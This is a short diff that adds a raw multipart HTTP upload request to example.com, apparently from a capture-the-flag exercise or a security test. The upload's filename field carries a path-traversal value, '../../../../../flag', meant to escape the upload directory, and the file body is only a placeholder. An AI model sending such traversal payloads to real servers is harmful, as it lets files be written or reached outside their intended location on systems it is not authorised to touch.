@@ -1,0 +1,11 @@
+POST / HTTP/1.1
+Host: example.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: length
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file-upload"; filename="../../../../../flag"
+Content-Type: application/octet-stream
+
+...file content...
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
